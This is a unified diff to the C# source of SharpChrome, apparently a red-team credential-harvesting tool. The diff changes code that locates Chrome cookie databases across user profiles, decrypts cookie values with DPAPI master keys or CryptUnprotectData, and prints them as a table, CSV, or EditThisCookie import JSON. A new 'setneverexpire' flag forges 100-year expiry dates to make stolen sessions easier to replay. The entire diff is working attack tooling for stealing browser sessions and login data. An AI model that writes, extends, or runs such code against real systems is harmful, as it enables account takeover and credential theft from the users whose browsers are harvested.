@@ -64,7 +64,7 @@ namespace SharpChrome
             }
         }
 
-        public static void TriageChromeCookies(Dictionary<string, string> MasterKeys, string computerName = "", string displayFormat = "csv", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "")
+        public static void TriageChromeCookies(Dictionary<string, string> MasterKeys, string computerName = "", string displayFormat = "csv", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "", bool setneverexpire = false)
         {
             // triage all Chrome Cookies we can reach
 
@@ -100,16 +100,16 @@ namespace SharpChrome
                     {
                         string cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", dir);
 
-                        ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, unprotect, cookieRegex, urlRegex);
+                        ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, unprotect, cookieRegex, urlRegex, setneverexpire);
                     }
                 }
             }
             else
             {
                 // otherwise just triage the current user's credential folder, so use CryptUnprotectData() by default
-                Console.WriteLine("[*] Triaging Chrome Cookies for current user\r\n");
+                Console.WriteLine("[*] Triaging Chrome Cookies for current user, using CryptUnprotectData() to decrypt.\r\n");
                 string cookiePath = String.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, true, cookieRegex, urlRegex);
+                ParseChromeCookies(MasterKeys, cookiePath, displayFormat, showAll, true, cookieRegex, urlRegex, setneverexpire);
             }
         }
 
@@ -178,6 +178,7 @@ namespace SharpChrome
                     {
                         if (!someResults)
                         {
+                            Console.WriteLine("--- Chrome Credential (Path: {0}) ---\r\n", loginDataFilePath);
                             Console.WriteLine("file_path,signon_realm,origin_url,date_created,times_used,username,password");
                         }
                         someResults = true;
@@ -196,7 +197,7 @@ namespace SharpChrome
             database.Close();
         }
 
-        public static void ParseChromeCookies(Dictionary<string, string> MasterKeys, string cookieFilePath, string displayFormat = "table", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "")
+        public static void ParseChromeCookies(Dictionary<string, string> MasterKeys, string cookieFilePath, string displayFormat = "table", bool showAll = false, bool unprotect = false, string cookieRegex = "", string urlRegex = "", bool setneverexpire = false)
         {
             // takes an individual Cookies file path and performs decryption/triage on it
 
@@ -232,111 +233,127 @@ namespace SharpChrome
             // old - fails in some cases due to partial indexing :(
             //string query = "SELECT cast(creation_utc as text) as creation_utc, host_key, name, path, cast(expires_utc as text) as expires_utc, is_secure, is_httponly, cast(last_access_utc as text) as last_access_utc, encrypted_value FROM cookies";
             
-            // new, seems to work with partial indexing??
+            // new, seems to work with partial indexing?? "/giphy table flip"
             string query = "SELECT cast(creation_utc as text) as creation_utc, host_key, name, path, cast(expires_utc as text) as expires_utc, cast(last_access_utc as text) as last_access_utc, encrypted_value FROM cookies";
             List<SQLiteQueryRow> results = database.Query2(query, false);
             int id = 1;
 
+            // used if cookies "never expire" for json output
+            DateTime epoch = new DateTime(1601, 1, 1);
+            TimeSpan timespan = (DateTime.Now).AddYears(100) - epoch;
+            long longExpiration = (long)Math.Abs(timespan.TotalSeconds * 1000000);
+
             foreach (SQLiteQueryRow row in results)
             {
-                byte[] valueBytes = (byte[])row.column[6].Value;
-                byte[] decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(valueBytes, MasterKeys, "chrome", unprotect);
-                string value = Encoding.ASCII.GetString(decBytes);
-
-                DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[0].Value.ToString());
-                DateTime expires = SharpDPAPI.Helpers.ConvertToDateTime(row.column[4].Value.ToString());
-                DateTime lastAccess = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());
-
-                // check conditions that will determine whether we're displaying this cookie entry
-                bool displayValue = false;
-                if (showAll)
+                try
                 {
-                    displayValue = true;
-                }
-                else if (!String.IsNullOrEmpty(cookieRegex))
-                {
-                    Match match = Regex.Match(row.column[2].Value.ToString(), cookieRegex, RegexOptions.IgnoreCase);
-                    if (match.Success)
+                    // decrypt the encrypted cookie value with whatever data/method is specified
+                    byte[] valueBytes = (byte[])row.column[6].Value;
+                    byte[] decBytes = SharpDPAPI.Dpapi.DescribeDPAPIBlob(valueBytes, MasterKeys, "chrome", unprotect);
+                    string value = Encoding.ASCII.GetString(decBytes);
+
+                    DateTime dateCreated = SharpDPAPI.Helpers.ConvertToDateTime(row.column[0].Value.ToString());
+                    DateTime expires = SharpDPAPI.Helpers.ConvertToDateTime(row.column[4].Value.ToString());
+                    DateTime lastAccess = SharpDPAPI.Helpers.ConvertToDateTime(row.column[5].Value.ToString());
+
+                    // check conditions that will determine whether we're displaying this cookie entry
+                    bool displayValue = false;
+                    if (showAll)
                     {
                         displayValue = true;
                     }
-                }
-                else if (!String.IsNullOrEmpty(urlRegex))
-                {
-                    Match match = Regex.Match(row.column[1].Value.ToString(), urlRegex, RegexOptions.IgnoreCase);
-                    if (match.Success)
+                    else if (!String.IsNullOrEmpty(cookieRegex))
                     {
-                        displayValue = true;
-                    }
-                }
-                else if (expires > DateTime.UtcNow)
-                {
-                    displayValue = true;
-                }
-
-                if (displayValue)
-                {
-                    if (displayFormat.Equals("table"))
-                    {
-                        if (!someResults)
+                        Match match = Regex.Match(row.column[2].Value.ToString(), cookieRegex, RegexOptions.IgnoreCase);
+                        if (match.Success)
                         {
-                            Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n", cookieFilePath);
+                            displayValue = true;
                         }
-                        someResults = true;
-
-                        Console.WriteLine("Host (path)                : {0} ({1})", row.column[1].Value, row.column[3].Value);
-                        Console.WriteLine("Cookie Name                : {0}", row.column[2].Value);
-                        Console.WriteLine("Cookie Value               : {0}", value);
-                        Console.WriteLine("Created/Expires/LastAccess : {0} / {1} / {2}\r\n", dateCreated, expires, lastAccess);
                     }
-                    else if (displayFormat.Equals("json"))
+                    else if (!String.IsNullOrEmpty(urlRegex))
                     {
-                        if (!someResults)
+                        Match match = Regex.Match(row.column[1].Value.ToString(), urlRegex, RegexOptions.IgnoreCase);
+                        if (match.Success)
                         {
-                            Console.WriteLine("--- Chrome Cookies (Path: {0}) ---\r\n\r\nEditThisCookie import JSON:\r\n\r\n[\r\n{{\r\n", cookieFilePath);
+                            displayValue = true;
+                        }
+                    }
+                    else if (expires > DateTime.UtcNow)
+                    {
+                        displayValue = true;
+                    }
+
+                    if (displayValue)
+                    {
+                        if (displayFormat.Equals("table"))
+                        {
+                            if (!someResults)
+                            {
+                                Console.WriteLine("[*] Chrome 'Cookies' path: {0}\r\n", cookieFilePath);
+                            }
+                            someResults = true;
+
+                            Console.WriteLine("Host (path)                : {0} ({1})", row.column[1].Value, row.column[3].Value);
+                            Console.WriteLine("Cookie Name                : {0}", row.column[2].Value);
+                            Console.WriteLine("Cookie Value               : {0}", value);
+                            Console.WriteLine("Created/Expires/LastAccess : {0} / {1} / {2}\r\n", dateCreated, expires, lastAccess);
+                        }
+                        else if (displayFormat.Equals("json"))
+                        {
+                            if (!someResults)
+                            {
+                                Console.WriteLine("[*] Chrome 'Cookies' path: {0}\r\n\r\nEditThisCookie import JSON:\r\n\r\n[\r\n{{\r\n", cookieFilePath);
+                            }
+                            else
+                            {
+                                Console.WriteLine("},\r\n{\r\n");
+                            }
+                            someResults = true;
+
+                            Console.WriteLine("    \"domain\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(String.Format("{0}", row.column[1].Value)));
+                            if (setneverexpire)
+                            {
+                                Console.WriteLine("    \"expirationDate\": {0},", longExpiration);
+                            }
+                            else
+                            {
+                                Console.WriteLine("    \"expirationDate\": {0},", row.column[4].Value.ToString());
+                            }
+                            Console.WriteLine("    \"hostOnly\": false,");
+                            Console.WriteLine("    \"httpOnly\": false,");
+                            Console.WriteLine("    \"name\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(String.Format("{0}", row.column[2].Value)));
+                            Console.WriteLine("    \"path\": \"{0}\",", String.Format("{0}", row.column[3].Value));
+                            Console.WriteLine("    \"sameSite\": \"no_restriction\",");
+                            Console.WriteLine("    \"secure\": false,");
+                            Console.WriteLine("    \"session\": false,");
+                            Console.WriteLine("    \"storeId\": \"0\",");
+                            Console.WriteLine("    \"value\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(value));
+                            Console.WriteLine("    \"id\": \"{0}\"", id);
+                            id++;
                         }
                         else
                         {
-                            Console.WriteLine("},\r\n{\r\n");
+                            // csv output
+                            if (!someResults)
+                            {
+                                Console.WriteLine("[*] Chrome 'Cookies' path: {0}\r\n", cookieFilePath);
+                                Console.WriteLine("file_path,host,path,name,value,creation_utc,expires_utc,last_access_utc");
+                            }
+                            someResults = true;
+
+                            Console.WriteLine("{0},{1},{2},{3},{4},{5},{6},{7}",
+                                    SharpDPAPI.Helpers.StringToCSVCell(cookieFilePath),
+                                    SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[1].Value)),
+                                    SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[3].Value)),
+                                    SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[2].Value)),
+                                    SharpDPAPI.Helpers.StringToCSVCell(value),
+                                    SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString()),
+                                    SharpDPAPI.Helpers.StringToCSVCell(expires.ToString()),
+                                    SharpDPAPI.Helpers.StringToCSVCell(lastAccess.ToString()));
                         }
-                        someResults = true;
-
-                        Int32 unixTimestamp = (Int32)(expires.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
-
-                        Console.WriteLine("    \"domain\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(String.Format("{0}", row.column[1].Value)));
-                        Console.WriteLine("    \"expirationDate\": {0},", unixTimestamp);
-                        Console.WriteLine("    \"hostOnly\": false,");
-                        Console.WriteLine("    \"httpOnly\": false,");
-                        Console.WriteLine("    \"name\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(String.Format("{0}", row.column[2].Value)));
-                        Console.WriteLine("    \"path\": \"{0}\",", String.Format("{0}", row.column[3].Value));
-                        Console.WriteLine("    \"sameSite\": \"no_restriction\",");
-                        Console.WriteLine("    \"secure\": false,");
-                        Console.WriteLine("    \"session\": false,");
-                        Console.WriteLine("    \"storeId\": \"0\",");
-                        Console.WriteLine("    \"value\": \"{0}\",", SharpDPAPI.Helpers.CleanForJSON(value));
-                        Console.WriteLine("    \"id\": \"{0}\"", id);
-                        id++;
-                    }
-                    else
-                    {
-                        // csv output
-                        if (!someResults)
-                        {
-                            Console.WriteLine("file_path,host,path,name,value,creation_utc,expires_utc,last_access_utc");
-                        }
-                        someResults = true;
-
-                        Console.WriteLine("{0},{1},{2},{3},{4},{5},{6},{7}",
-                                SharpDPAPI.Helpers.StringToCSVCell(cookieFilePath),
-                                SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[1].Value)),
-                                SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[3].Value)),
-                                SharpDPAPI.Helpers.StringToCSVCell(String.Format("{0}", row.column[2].Value)),
-                                SharpDPAPI.Helpers.StringToCSVCell(value),
-                                SharpDPAPI.Helpers.StringToCSVCell(dateCreated.ToString()),
-                                SharpDPAPI.Helpers.StringToCSVCell(expires.ToString()),
-                                SharpDPAPI.Helpers.StringToCSVCell(lastAccess.ToString()));
                     }
                 }
+                catch { }
             }
 
             if (displayFormat.Equals("json") && someResults)
